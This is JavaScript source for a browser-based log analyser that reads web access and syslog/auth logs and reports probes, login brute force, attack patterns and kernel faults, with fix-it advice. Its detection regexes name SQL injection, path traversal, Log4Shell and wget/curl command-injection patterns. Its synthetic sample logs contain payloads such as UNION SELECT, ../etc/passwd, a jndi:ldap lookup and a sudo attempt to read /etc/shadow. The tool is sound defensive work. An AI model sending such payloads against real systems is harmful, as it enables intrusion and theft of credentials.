(function(){
"use strict";
var $=function(i){return document.getElementById(i)};
function el(t,c,x){var e=document.createElement(t);if(c)e.className=c;if(x!==undefined&&x!==null)e.textContent=String(x);return e}
function plural(n,w){return n.toLocaleString("en-US")+" "+(n===1?w:/[^aeiou]y$/.test(w)?w.slice(0,-1)+"ies":/(s|x|ch|sh)$/.test(w)?w+"es":w+"s")}
function inc(o,k,n){o[k]=(o[k]||0)+(n||1)}
function top(o,n){return Object.keys(o).map(function(k){return [k,o[k]]}).sort(function(a,b){return b[1]-a[1]}).slice(0,n||10)}
function pct(a,b){return b?Math.round(a/b*1000)/10+"%":"0%"}
var MON={Jan:0,Feb:1,Mar:2,Apr:3,May:4,Jun:5,Jul:6,Aug:7,Sep:8,Oct:9,Nov:10,Dec:11};
function stamp(ms){return isNaN(ms)?"?":new Date(ms).toISOString().replace("T"," ").slice(0,16)}

/* ---------- line formats ---------- */
var RE_WEB=/^(?:\S+ )?(\S+) \S+ (\S+) \[(\d{2})\/(\w{3})\/(\d{4}):(\d{2}):(\d{2}):(\d{2}) ([+-]\d{4})\] "([A-Z]+) (\S+)[^"]*" (\d{3}) (\d+|-)(?: "([^"]*)" "([^"]*)")?/;
var RE_SYS=/^(\w{3})\s+(\d{1,2}) (\d{2}):(\d{2}):(\d{2}) (\S+) ([^\s:\[]+)(?:\[(\d+)\])?: (.*)$/;
var RE_ISO=/^(\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2})(?:[.,]\d+)?(Z|[+-]\d{2}:?\d{2})? (\S+) ([^\s:\[]+)(?:\[(\d+)\])?: (.*)$/;
var PROBE=/^\/(\.env|\.git\/|\.aws\/|\.ssh\/|wp-login\.php|xmlrpc\.php|wp-admin|wp-content\/plugins|wp-includes\/|phpmyadmin|pma\/|admin\/config|cgi-bin\/|actuator|vendor\/phpunit|boaform|HNAP1|manager\/html|solr\/|owa\/|ecp\/|autodiscover\/|config\.json|server-status|\.DS_Store|backup\.|db\.sql|dump\.sql|shell\.php|eval-stdin\.php|telescope\/|_ignition\/|console\/|api\/v1\/pods|druid\/|remote\/fgt_lang|global-protect\/|sslvpn|\.well-known\/security\.txt\.bak)/i;
var SENSITIVE=/^\/(\.env|\.git\/|\.aws\/|\.ssh\/|phpmyadmin|pma\/|vendor\/phpunit|actuator|config\.json|server-status|\.DS_Store|backup\.|db\.sql|dump\.sql|shell\.php|eval-stdin\.php|telescope\/|_ignition\/|manager\/html)/i;
var LOGIN=/(wp-login\.php|xmlrpc\.php|\/login|\/signin|\/user\/login|\/admin\/login|\/auth|\/session|\/api\/token|\/owa\/auth)/i;
var PAYLOAD=[[/union[\s+%20]+(all[\s+%20]+)?select|select.+from.+information_schema|'(\s|%20|\+)*or(\s|%20|\+)*'?1'?=/i,"SQL injection"],[/\.\.\/\.\.\/|\.\.%2f|%2e%2e%2f|\/etc\/passwd|\\\\windows\\\\win\.ini|boot\.ini/i,"path traversal"],[/<script|%3cscript|javascript:|onerror=/i,"cross-site scripting"],[/\$\{jndi:|%24%7bjndi/i,"Log4Shell"],[/;(\s|%20)*(wget|curl|bash|sh)\b|\|(\s|%20)*(wget|curl|bash)\b|\$\(.*(wget|curl)|`.*(wget|curl)/i,"command injection"],[/php:\/\/input|data:\/\/text|expect:\/\//i,"PHP wrapper abuse"]];
var BOT=/bot|crawl|spider|slurp|scan|curl\/|wget\/|python-requests|go-http-client|zgrab|masscan|nmap|nikto|sqlmap|libwww|httpclient|okhttp|axios|java\/|headless/i;

function parse(text){
  var lines=text.split(/\r?\n/),cap=600000,total=lines.length;if(lines.length>cap)lines=lines.slice(-cap);
  var year=new Date().getFullYear(),nowMonth=new Date().getMonth(),web=[],sys=[],other=0,m;
  for(var i=0;i<lines.length;i++){var l=lines[i];if(!l)continue;
    if((m=RE_WEB.exec(l))){var off=(+m[9].slice(1,3)*60+ +m[9].slice(3))*(m[9][0]==="-"?-1:1);
      web.push({ip:m[1],user:m[2],t:Date.UTC(+m[5],MON[m[4]],+m[3],+m[6],+m[7],+m[8])-off*60000,meth:m[10],path:m[11],st:+m[12],bytes:m[13]==="-"?0:+m[13],ua:m[15]||""});continue}
    if((m=RE_SYS.exec(l))){var mo=MON[m[1]];if(mo===undefined){other++;continue}var y=mo>nowMonth+1?year-1:year;
      sys.push({t:Date.UTC(y,mo,+m[2],+m[3],+m[4],+m[5]),host:m[6],proc:m[7],msg:m[9]});continue}
    if((m=RE_ISO.exec(l))){var tz=m[2]||"Z";if(/^[+-]\d{4}$/.test(tz))tz=tz.slice(0,3)+":"+tz.slice(3);sys.push({t:Date.parse(m[1].replace(" ","T")+tz),host:m[3],proc:m[4],msg:m[6]});continue}
    other++;
  }
  if(!web.length&&!sys.length)throw new Error("no log lines recognised. This page reads web server access logs (nginx, Apache) and syslog-style logs (auth.log, secure, syslog, messages, journalctl)");
  return {web:web,sys:sys,other:other,total:total,capped:total>cap};
}
function buckets(times,flags){
  var lo=Infinity,hi=-Infinity;times.forEach(function(t){if(t<lo)lo=t;if(t>hi)hi=t});
  var span=Math.max(hi-lo,60000),steps=[60e3,300e3,900e3,3600e3,6*3600e3,86400e3,7*86400e3],size=steps[steps.length-1];
  for(var i=0;i<steps.length;i++)if(span/steps[i]<=72){size=steps[i];break}
  var n=Math.floor(span/size)+1,a=new Array(n),b=new Array(n);for(var j=0;j<n;j++){a[j]=0;b[j]=0}
  times.forEach(function(t,k){var x=Math.floor((t-lo)/size);a[x]++;if(flags[k])b[x]++});
  return {lo:lo,hi:hi,size:size,all:a,bad:b,label:size<3600e3?(size/60e3)+" min":size<86400e3?(size/3600e3)+" h":(size/86400e3)+" d"};
}

/* ---------- web ---------- */
function web(L){
  var F=[],ips={},paths={},st={},uas={},n404={},n5={},probe={},probeHit=[],login={},pay={},payHit=[],bytes=0,botN=0;
  L.forEach(function(r){
    inc(st,r.st);bytes+=r.bytes;var o=ips[r.ip]||(ips[r.ip]={n:0,e4:0,e5:0,ua:r.ua,probes:0,logins:0});o.n++;
    var p=r.path.split("?")[0];inc(paths,p);if(r.ua){inc(uas,r.ua);if(BOT.test(r.ua))botN++}
    if(r.st===404)inc(n404,p);if(r.st>=400&&r.st<500)o.e4++;if(r.st>=500){o.e5++;inc(n5,p)}
    if(PROBE.test(p)){o.probes++;inc(probe,p);if(r.st===200&&SENSITIVE.test(p)&&probeHit.length<200)probeHit.push(r)}
    if(r.meth==="POST"&&LOGIN.test(p)){o.logins++;inc(login,r.ip+" "+p)}
    for(var i=0;i<PAYLOAD.length;i++)if(PAYLOAD[i][0].test(r.path)){inc(pay,PAYLOAD[i][1]);if(payHit.length<300)payHit.push([r,PAYLOAD[i][1]]);break}
  });
  var total=L.length,ipList=Object.keys(ips),e5=0,e4=0;Object.keys(st).forEach(function(k){if(+k>=500)e5+=st[k];else if(+k>=400)e4+=st[k]});
  var B=buckets(L.map(function(r){return r.t}),L.map(function(r){return r.st>=500}));
  function add(sev,title,text,cols,rows,steps){F.push({sev:sev,title:title,text:text,cols:cols,rows:rows,steps:steps})}
  if(probeHit.length){var ph={};probeHit.forEach(function(r){inc(ph,r.path.split("?")[0])});
    add("high","Probes that got an answer",plural(probeHit.length,"request")+" for files that should not exist or not be public came back with status 200. Each one needs a look: either the application answers 200 for everything, or something is really exposed. A readable .env or .git folder hands out passwords and source code.",["Path","Times answered with 200"],top(ph,15),["Open each path yourself and see what comes back.","If it is real: remove the file or block the path in the web server, then change every secret that was in it.","If the application answers 200 with an error page: fix that, because it hides real findings in every scanner and log."])}
  var payOk=payHit.filter(function(x){return x[0].st>=200&&x[0].st<400});
  if(payHit.length)add(payOk.length?"high":"med","Attack patterns in requests",plural(payHit.length,"request")+" carried a known attack pattern in the address: "+top(pay,6).map(function(x){return x[0]+" ("+x[1]+")"}).join(", ")+". "+(payOk.length?payOk.length+" of them were answered with a success or redirect status, which does not prove they worked, but those are the ones to check.":"All of them were rejected with an error status."),["Time","Address","Kind","Status","Request"],(payOk.length?payOk:payHit).slice(0,15).map(function(x){return [stamp(x[0].t),x[0].ip,x[1],x[0].st,x[0].path.slice(0,90)]}),["Check the application log for the same moments.","Make sure the software behind the hit paths is patched.","A web application firewall or the rate limit of the web server takes the pressure off."]);
  var brute=top(login,400).filter(function(x){return x[1]>=20});
  if(brute.length)add("high","Password guessing against a login page",plural(brute.length,"address")+" sent twenty or more login attempts to the same form. "+(brute[0][1]>=200?"The busiest sent "+brute[0][1].toLocaleString("en-US")+".":""),["Address and form","POST requests"],brute.slice(0,15),["Limit login attempts per address in the web server or the application.","Put admin logins behind a second factor, an IP allow list or a VPN.","If nobody needs xmlrpc.php, block it."]);
  var worst=0,wi=-1;B.bad.forEach(function(x,i){if(x>worst){worst=x;wi=i}});
  if(e5/total>0.05&&e5>=20)add("high","Many server errors",pct(e5,total)+" of all requests ended with a 5xx status ("+e5.toLocaleString("en-US")+"). The worst "+B.label+" started at "+stamp(B.lo+wi*B.size)+" UTC with "+worst+". The cause is in the error log of the web server or the application, at that time.",["Path","5xx answers"],top(n5,12),["Read the error log around the peak.","502 and 504 mean the application behind the web server did not answer.","503 usually means overloaded or in maintenance."]);
  else if(worst>=20&&wi>=0)add("med","A burst of server errors",worst+" requests failed with a 5xx status in the "+B.label+" from "+stamp(B.lo+wi*B.size)+" UTC. Outside that window the rate is low.",["Path","5xx answers"],top(n5,10),["Read the error log at that time: a restart, a deployment or a dependency that was down."]);
  var scan=ipList.filter(function(k){return ips[k].probes>=5}).sort(function(a,b){return ips[b].probes-ips[a].probes});
  if(scan.length)add("info","Vulnerability scanners",plural(scan.length,"address")+" asked for typical probe paths such as "+top(probe,4).map(function(x){return x[0]}).join(", ")+". This is the background noise of the internet and arrives at every public server. It matters only when a probe finds something.",["Address","Probe requests","All requests","User agent"],scan.slice(0,15).map(function(k){return [k,ips[k].probes,ips[k].n,ips[k].ua.slice(0,60)]}),["Nothing to do if the probes got 404 or 403.","To cut the noise: block repeat offenders with fail2ban or a rate limit."]);
  var big=top(Object.keys(ips).reduce(function(a,k){a[k]=ips[k].n;return a},{}),1)[0];
  if(big&&big[1]/total>0.3&&big[1]>=500)add("med","One address makes "+pct(big[1],total)+" of the traffic",big[0]+" sent "+big[1].toLocaleString("en-US")+" requests. That can be your own monitoring, a proxy or load balancer in front of the server (then every visitor shows this address), an aggressive crawler, or an attack.",["Address","Requests","4xx","5xx","User agent"],[[big[0],big[1],ips[big[0]].e4,ips[big[0]].e5,ips[big[0]].ua.slice(0,70)]],["If it is your proxy: log the X-Forwarded-For header instead, otherwise this log tells you little.","If it is a crawler: robots.txt for the polite ones, a rate limit for the rest."]);
  if(botN/total>0.4&&total>200)add("info","Mostly automated traffic",pct(botN,total)+" of the requests come from clients that identify as bots, crawlers or scripts. Real visitors are the smaller part of this log.",null,null,[]);
  return {kind:"web",F:F,B:B,total:total,
   tiles:[["requests",total.toLocaleString("en-US"),stamp(B.lo)+" to "+stamp(B.hi)+" UTC"],["addresses",ipList.length.toLocaleString("en-US"),"distinct clients"],["server errors",pct(e5,total),e5.toLocaleString("en-US")+" answers with 5xx"],["not found and denied",pct(e4,total),e4.toLocaleString("en-US")+" answers with 4xx"]],
   lists:[["status codes",["Status","Requests","Share"],top(st,12).map(function(x){return [x[0],x[1].toLocaleString("en-US"),pct(x[1],total)]})],
    ["busiest addresses",["Address","Requests","4xx","5xx","User agent"],ipList.sort(function(a,b){return ips[b].n-ips[a].n}).slice(0,12).map(function(k){return [k,ips[k].n.toLocaleString("en-US"),ips[k].e4,ips[k].e5,ips[k].ua.slice(0,60)]})],
    ["most requested paths",["Path","Requests"],top(paths,12)],["most frequent 404s",["Path","Times"],top(n404,12)],["user agents",["User agent","Requests"],top(uas,10).map(function(x){return [x[0].slice(0,110),x[1]]})]],
   chart:"Requests per "+B.label+", server errors in pink"};
}

/* ---------- syslog and auth ---------- */
var KERN=[[/out of memory|oom-kill|killed process/i,"Out of memory: the kernel killed a process","high"],[/i\/o error|blk_update_request|medium error|critical target error/i,"Disk I/O errors","high"],[/ext4-fs error|xfs.*(corrupt|error)|btrfs.*error|remounting filesystem read-only/i,"File system errors","high"],[/no space left on device/i,"Disk full","high"],
 [/segfault|general protection fault/i,"Programs crashing (segfault)","med"],[/blocked for more than \d+ seconds|soft lockup|hung_task/i,"Tasks hanging in the kernel","med"],[/link is down|nic link is down|carrier lost/i,"Network link went down","med"],[/thermal|temperature above threshold|cpu clock throttled/i,"Overheating or throttling","med"],
 [/failed to start|entered failed state|failed with result|main process exited, code=(exited|killed|dumped)/i,"Services that failed","med"],[/certificate (has expired|verify failed)|ssl.*handshake fail/i,"Certificate or TLS problems","info"],[/time has been changed|clock.*(step|jump)|time reset/i,"Clock jumps","info"]];
function norm(m){return m.replace(/\b\d{1,3}(\.\d{1,3}){3}\b/g,"<ip>").replace(/\b[0-9a-f]{8,}\b/gi,"<id>").replace(/\d+/g,"<n>").slice(0,140)}
function sys(L){
  var F=[],procs={},inv2={},invUser={},inv2N=0,fail={},failUser={},okIp={},ok=[],inval=0,failN=0,sudo={},notSudo=[],newUser=[],kern={},errs={},errN=0,rootPw=[],pwOk=0,keyOk=0,m;
  L.forEach(function(r){
    inc(procs,r.proc);var s=r.msg;
    if(/^sshd/.test(r.proc)){
      if((m=/Failed (?:password|publickey|keyboard-interactive\/pam) for (invalid user )?(\S+) from (\S+)/.exec(s))){failN++;if(m[1])inval++;inc(fail,m[3]);inc(failUser,m[2]);r.bad=true}
      else if((m=/Invalid user (\S*) from (\S+)/.exec(s))){inc(inv2,m[2]);inc(invUser,m[1]||"(empty)");inv2N++;r.bad=true}
      else if((m=/Accepted (\S+) for (\S+) from (\S+)/.exec(s))){ok.push({t:r.t,how:m[1],user:m[2],ip:m[3],before:fail[m[3]]||0});if(m[1]==="password"){pwOk++;if(m[2]==="root")rootPw.push(r)}else keyOk++;(okIp[m[3]]=okIp[m[3]]||[]).push(m[2])}
      else if(/maximum authentication attempts exceeded|Connection closed by authenticating user|authentication failure/.test(s)){r.bad=true}
    }else if(r.proc==="sudo"){
      if((m=/^\s*(\S+) : .*COMMAND=(.*)$/.exec(s))){inc(sudo,m[1]);if(/user NOT in sudoers|incorrect password attempts/.test(s)){notSudo.push([stamp(r.t),m[1],/NOT in sudoers/.test(s)?"not in sudoers":"wrong password",m[2].slice(0,80)]);r.bad=true}}
    }else if(/^(useradd|usermod|groupadd|passwd|chpasswd)$/.test(r.proc)){if(/new user|add '.*' to group|password changed|new group/.test(s))newUser.push([stamp(r.t),r.proc,s.slice(0,120)])}
    for(var i=0;i<KERN.length;i++)if(KERN[i][0].test(s)){(kern[i]=kern[i]||[]).push(r);r.bad=true;break}
    if(/\b(error|failed|failure|fatal|critical|panic|denied|refused|timed out|timeout)\b/i.test(s)){errN++;inc(errs,r.proc+": "+norm(s));if(!/^sshd/.test(r.proc))r.err=true}
  });
  if(!failN&&inv2N){fail=inv2;failUser=invUser;failN=inv2N;inval=inv2N}
  var total=L.length,B=buckets(L.map(function(r){return r.t}),L.map(function(r){return !!r.bad||!!r.err}));
  function add(sev,title,text,cols,rows,steps){F.push({sev:sev,title:title,text:text,cols:cols,rows:rows,steps:steps})}
  var guessed=ok.filter(function(o){return o.before>=5&&o.how==="password"});
  if(guessed.length)add("crit","A password was guessed","An address that had failed several times then logged in with a password. This is what a successful brute-force attack looks like in the log. It can also be a user who mistyped a lot, so check who it was, but treat it as a break-in until you know.",["Time (UTC)","User","Address","Failures before"],guessed.slice(0,15).map(function(o){return [stamp(o.t),o.user,o.ip,o.before]}),["Ask the account's owner whether that was them.","If not: lock the account, end its sessions, change the password, and look at what the session did (shell history, new files, new keys in authorized_keys, cron jobs).","Then switch SSH to keys only: PasswordAuthentication no."]);
  if(rootPw.length)add("high","root logged in with a password",plural(rootPw.length,"login")+" as root by password. Direct root logins by password are the first thing attackers try, and nothing in the log says who it really was.",["Time (UTC)","Line"],rootPw.slice(0,10).map(function(r){return [stamp(r.t),r.msg.slice(0,100)]}),["Set PermitRootLogin prohibit-password (keys only) or no, and use sudo from a personal account."]);
  if(notSudo.length)add("high","sudo was refused",plural(notSudo.length,"attempt")+" to use sudo failed. \"Not in sudoers\" means an account tried to become root that has no right to.",["Time (UTC)","User","Why","Command"],notSudo.slice(0,15),["Ask the user. If the account should not have tried, treat it as compromised."]);
  Object.keys(kern).forEach(function(i){var k=KERN[i],list=kern[i];add(k[2],k[1],plural(list.length,"line")+", first at "+stamp(list[0].t)+" UTC, last at "+stamp(list[list.length-1].t)+" UTC.",["Time (UTC)","Process","Message"],list.slice(0,10).map(function(r){return [stamp(r.t),r.proc,r.msg.slice(0,130)]}),
    k[1].indexOf("memory")>=0?["The line names the process that was killed, which is not always the one that used the memory.","Find the service that grows and give it a limit, or the machine more memory."]:k[1].indexOf("Disk I/O")>=0||k[1].indexOf("File system")>=0?["Check the disk now: smartctl -a, and make sure the backup is current.","Do not run a repair on a disk that is failing before the data is safe."]:k[1].indexOf("full")>=0?["df -h and df -i, then find what grows."]:[])});
  if(newUser.length)add("med","Accounts or passwords were changed",plural(newUser.length,"event")+". Expected during setup, worth a question at any other time.",["Time (UTC)","Tool","Line"],newUser.slice(0,15),["Match each line with a change you know about."]);
  var attackers=top(fail,500).filter(function(x){return x[1]>=10});
  if(attackers.length)add(guessed.length?"med":"info","Password guessing against SSH",failN.toLocaleString("en-US")+" failed logins from "+plural(Object.keys(fail).length,"address")+", "+attackers.length+" of them with ten or more tries. "+inval.toLocaleString("en-US")+" attempts used account names that do not exist. This reaches every server with SSH open to the internet. It only matters when one of them gets in.",["Address","Failed logins"],attackers.slice(0,15),["Keys only: PasswordAuthentication no ends the whole topic.","fail2ban or a firewall allow list cuts the noise.","Moving SSH to another port reduces the log volume, not the risk."]);
  if(pwOk&&!guessed.length)add("info","Password logins are allowed",pwOk+" successful login"+(pwOk===1?"":"s")+" by password, "+keyOk+" by key. As long as passwords are accepted, guessing them can work.",null,null,["Roll out keys, then set PasswordAuthentication no."]);
  var rep=top(errs,8).filter(function(x){return x[1]>=10});
  if(rep.length)add("info","The same error, over and over","Lines containing error, failed, denied or timeout, grouped by their wording with numbers and addresses taken out.",["Message","Times"],rep.map(function(x){return [x[0],x[1].toLocaleString("en-US")]}),["A message that repeats thousands of times usually has one cause. Fix it or silence it, because it hides everything else."]);
  var isAuth=failN+ok.length>total*0.2;
  return {kind:isAuth?"auth":"sys",F:F,B:B,total:total,
   tiles:isAuth?[["lines",total.toLocaleString("en-US"),stamp(B.lo)+" to "+stamp(B.hi)+" UTC"],["failed logins",failN.toLocaleString("en-US"),"from "+plural(Object.keys(fail).length,"address")],["successful logins",ok.length.toLocaleString("en-US"),keyOk+" by key, "+pwOk+" by password"],["sudo commands",Object.keys(sudo).reduce(function(a,k){return a+sudo[k]},0).toLocaleString("en-US"),"by "+plural(Object.keys(sudo).length,"user")]]
    :[["lines",total.toLocaleString("en-US"),stamp(B.lo)+" to "+stamp(B.hi)+" UTC"],["error lines",errN.toLocaleString("en-US"),pct(errN,total)+" of all"],["processes",Object.keys(procs).length.toLocaleString("en-US"),"that wrote to the log"],["hardware and kernel",String(Object.keys(kern).length),"kinds of serious events"]],
   lists:[["who logged in",["Time (UTC)","User","Address","How","Failures from that address before"],ok.slice(-15).reverse().map(function(o){return [stamp(o.t),o.user,o.ip,o.how,o.before]})],["account names that were tried",["Name","Times"],top(failUser,15)],["who writes the most",["Process","Lines","Share"],top(procs,12).map(function(x){return [x[0],x[1].toLocaleString("en-US"),pct(x[1],total)]})],["sudo by user",["User","Commands"],top(sudo,10)]],
   chart:"Lines per "+B.label+", failures and errors in pink"};
}

/* ---------- render ---------- */
function table(cols,rows){var w=el("div","tw"),t=el("table","tbl lgtbl"),h=el("thead"),r=el("tr"),b=el("tbody");cols.forEach(function(c){r.append(el("th",null,c))});h.append(r);rows.forEach(function(x){var tr=el("tr");x.forEach(function(c){tr.append(el("td",null,c))});b.append(tr)});t.append(h,b);w.append(t);return w}
function render(P,name){
  var out=$("lg-out");out.replaceChildren();
  var parts=[];if(P.web.length)parts.push(web(P.web));if(P.sys.length)parts.push(sys(P.sys));
  parts.sort(function(a,b){return b.total-a.total});
  var rank={crit:0,high:1,med:2,info:3},all=[];parts.forEach(function(p){p.F.forEach(function(f){all.push(f)})});all.sort(function(a,b){return rank[a.sev]-rank[b.sev]});
  var worst=all.length?all[0].sev:"none",main=parts[0];
  var v=el("div","verdict v-"+(worst==="none"||worst==="info"?"none":worst));
  v.append(el("b",null,worst==="crit"?"Act now":worst==="high"?"Needs attention":worst==="med"?"Worth a look":"Nothing alarming"),el("span",null,{web:"web server access log",auth:"login and authentication log",sys:"system log"}[main.kind]+" · "+plural(main.total,"line")+" · "+(all.length?plural(all.length,"finding"):"no findings")));
  out.append(v);
  parts.forEach(function(p,pi){
    if(parts.length>1)out.append(el("h2",null,{web:"web server part",auth:"login part",sys:"system part"}[p.kind]));
    var st=el("div","stats");st.style.setProperty("--cols","4");p.tiles.forEach(function(t){var x=el("div","stat"),b=el("b","stat-v",t[1]);b.setAttribute("data-raw","");x.append(el("span","stat-k",t[0]),b,el("span","stat-s",t[2]));st.append(x)});out.append(st);
    var max=Math.max.apply(null,p.B.all)||1,ch=el("div","lgchart");ch.setAttribute("aria-hidden","true");
    p.B.all.forEach(function(n,i){var c=el("i");c.style.height=Math.max(n?3:0,Math.round(n/max*100))+"%";c.title=stamp(p.B.lo+i*p.B.size)+": "+n;if(p.B.bad[i]){var r=el("b");r.style.height=Math.round(p.B.bad[i]/n*100)+"%";c.append(r)}ch.append(c)});
    var peak=p.B.all.indexOf(max);out.append(ch,el("div","lgax",null));out.lastChild.append(el("span",null,stamp(p.B.lo)),el("span",null,stamp(p.B.hi)));
    out.append(el("p","dim lgcap",p.chart+". Busiest: "+stamp(p.B.lo+peak*p.B.size)+" UTC with "+max.toLocaleString("en-US")+"."));
  });
  out.append(el("h2",null,"findings"));
  if(!all.length)out.append(el("p","dim","None of the patterns this page looks for showed up. It reads for known trouble, it does not understand your application."));
  all.forEach(function(f,i){var d=el("details","finding"),s=el("summary");s.append(el("span","sevtag s-"+f.sev,{crit:"critical",high:"high",med:"medium",info:"info"}[f.sev]),el("b",null,f.title));d.append(s,el("p",null,f.text));
    if(f.rows&&f.rows.length)d.append(table(f.cols,f.rows));if(f.steps&&f.steps.length){d.append(el("h3","fh","what to do"));var ol=el("ol","steps");f.steps.forEach(function(x){ol.append(el("li",null,x))});d.append(ol)}
    if(i<3&&rank[f.sev]<=1)d.open=true;out.append(d)});
  parts.forEach(function(p){p.lists.forEach(function(l){if(!l[2].length)return;out.append(el("h2",null,l[0]),table(l[1],l[2]))})});
  $("lg-status").textContent=plural(P.web.length+P.sys.length,"line")+" read from "+name+"."+(P.other?" "+plural(P.other,"line")+" in a format this page does not know "+(P.other===1?"was":"were")+" skipped.":"")+(P.capped?" The file is very large: only the last 600,000 lines were read.":"");
  out.hidden=false;
}
function load(text,name){
  try{render(parse(text),name);$("lg-out").scrollIntoView({behavior:"smooth",block:"start"})}
  catch(e){$("lg-out").hidden=true;$("lg-status").textContent="Could not read that: "+e.message+"."}
}

/* ---------- made-up samples ---------- */
function rng(seed){var s=seed;return function(){s=(s*1664525+1013904223)%4294967296;return s/4294967296}}
function p2(n){return (n<10?"0":"")+n}
var MN=["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
function sampleWeb(){
  var r=rng(7),L=[],t0=Date.UTC(2026,9,5,6,0,0),pages=["/","/","/","/products","/products/widget-a","/contact","/about","/css/site.css","/js/app.js","/img/logo.svg","/blog/","/blog/hello","/api/items","/favicon.ico"],uas=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/141.0 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 Version/18.0 Safari/605.1.15","Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"];
  function line(t,ip,meth,path,st,ua){var d=new Date(t);L.push([t,ip+" - - ["+p2(d.getUTCDate())+"/"+MN[d.getUTCMonth()]+"/"+d.getUTCFullYear()+":"+p2(d.getUTCHours())+":"+p2(d.getUTCMinutes())+":"+p2(d.getUTCSeconds())+" +0000] \""+meth+" "+path+" HTTP/1.1\" "+st+" "+Math.floor(200+r()*9000)+" \"-\" \""+ua+"\""])}
  for(var i=0;i<1500;i++){var t=t0+Math.floor(r()*8*3600e3),ip="198.51."+Math.floor(r()*100)+"."+Math.floor(1+r()*250),pg=pages[Math.floor(r()*pages.length)];line(t,ip,"GET",pg,r()<0.02?404:r()<0.04?304:200,uas[Math.floor(r()*uas.length)])}
  var probes=["/.env","/.git/config","/wp-login.php","/phpmyadmin/index.php","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","/cgi-bin/luci","/actuator/health","/.aws/credentials","/backup.zip","/server-status","/owa/auth/logon.aspx","/boaform/admin/formLogin"];
  ["203.0.113.66","203.0.113.140","192.0.2.201"].forEach(function(ip,k){for(var j=0;j<60;j++){var p=probes[Math.floor(r()*probes.length)];line(t0+(1+k*2)*3600e3+j*900,ip,"GET",p,p==="/.env"&&k===0?200:404,k===2?"python-requests/2.31":"Mozilla/5.0 zgrab/0.x")}});
  for(var b=0;b<340;b++)line(t0+4*3600e3+b*2100,"192.0.2.77","POST","/wp-login.php",b%50===49?302:200,"Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0");
  for(var e=0;e<90;e++)line(t0+5.5*3600e3+Math.floor(r()*240e3),"198.51."+Math.floor(r()*100)+"."+Math.floor(1+r()*250),"GET",r()<0.6?"/api/items":"/products",r()<0.7?502:504,uas[0]);
  line(t0+2.2*3600e3,"203.0.113.9","GET","/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",200,"sqlmap/1.8");line(t0+2.2*3600e3+4000,"203.0.113.9","GET","/download?file=../../../../etc/passwd",400,"sqlmap/1.8");line(t0+2.3*3600e3,"203.0.113.9","GET","/search?q=%3Cscript%3Ealert(1)%3C/script%3E",200,"sqlmap/1.8");
  line(t0+3*3600e3,"203.0.113.31","GET","/?x=${jndi:ldap://203.0.113.31/a}",404,"Mozilla/5.0");
  return L.sort(function(a,b){return a[0]-b[0]}).map(function(x){return x[1]}).join("\n");
}
function sampleAuth(){
  var r=rng(11),L=[],t0=Date.UTC(new Date().getFullYear(),9,4,22,0,0),names=["admin","root","test","oracle","ubuntu","postgres","git","user","deploy","pi","ftpuser","guest","support","jenkins"];
  function line(t,proc,msg){var d=new Date(t);L.push([t,MN[d.getUTCMonth()]+" "+(d.getUTCDate()<10?" ":"")+d.getUTCDate()+" "+p2(d.getUTCHours())+":"+p2(d.getUTCMinutes())+":"+p2(d.getUTCSeconds())+" web01 "+proc+": "+msg])}
  ["203.0.113.50","203.0.113.51","198.51.100.23","192.0.2.180","192.0.2.44"].forEach(function(ip,k){for(var i=0;i<60+k*45;i++){var n=names[Math.floor(r()*names.length)],t=t0+k*3000e3+i*4000+Math.floor(r()*3000);
    if(n==="root"||n==="deploy")line(t,"sshd["+(2000+i)+"]","Failed password for "+n+" from "+ip+" port "+(40000+i)+" ssh2");else{line(t,"sshd["+(2000+i)+"]","Invalid user "+n+" from "+ip+" port "+(40000+i));line(t+900,"sshd["+(2000+i)+"]","Failed password for invalid user "+n+" from "+ip+" port "+(40000+i)+" ssh2")}}});
  for(var j=0;j<38;j++)line(t0+5*3600e3+j*5000,"sshd["+(5000+j)+"]","Failed password for deploy from 192.0.2.99 port "+(51000+j)+" ssh2");
  line(t0+5*3600e3+38*5000,"sshd[5040]","Accepted password for deploy from 192.0.2.99 port 51038 ssh2");
  line(t0+5*3600e3+200e3,"sudo","  deploy : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow");
  line(t0+5*3600e3+260e3,"sudo","  deploy : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/su -");
  [[8,"anna","198.51.100.7"],[9,"anna","198.51.100.7"],[10,"marc","198.51.100.9"]].forEach(function(x){line(t0+x[0]*3600e3,"sshd[7001]","Accepted publickey for "+x[1]+" from "+x[2]+" port 50222 ssh2: ED25519 SHA256:abcdefg");line(t0+x[0]*3600e3+60e3,"sudo","    "+x[1]+" : TTY=pts/0 ; PWD=/home/"+x[1]+" ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx")});
  return L.sort(function(a,b){return a[0]-b[0]}).map(function(x){return x[1]}).join("\n");
}
function sampleSys(){
  var r=rng(3),L=[],t0=Date.UTC(new Date().getFullYear(),9,5,0,0,0);
  function line(t,proc,msg){var d=new Date(t);L.push([t,MN[d.getUTCMonth()]+" "+(d.getUTCDate()<10?" ":"")+d.getUTCDate()+" "+p2(d.getUTCHours())+":"+p2(d.getUTCMinutes())+":"+p2(d.getUTCSeconds())+" app01 "+proc+": "+msg])}
  for(var i=0;i<700;i++){var t=t0+Math.floor(r()*12*3600e3),k=r();if(k<0.45)line(t,"systemd[1]","Started Session "+Math.floor(r()*900)+" of User app.");else if(k<0.75)line(t,"CRON["+Math.floor(1000+r()*9000)+"]","(app) CMD (/usr/local/bin/sync.sh)");else if(k<0.9)line(t,"dhclient["+612+"]","DHCPREQUEST for 10.87.20.31 on eth0 to 10.87.20.10 port 67");else line(t,"systemd-timesyncd[410]","Timed out waiting for reply from 10.87.20.10:123 (10.87.20.10).")}
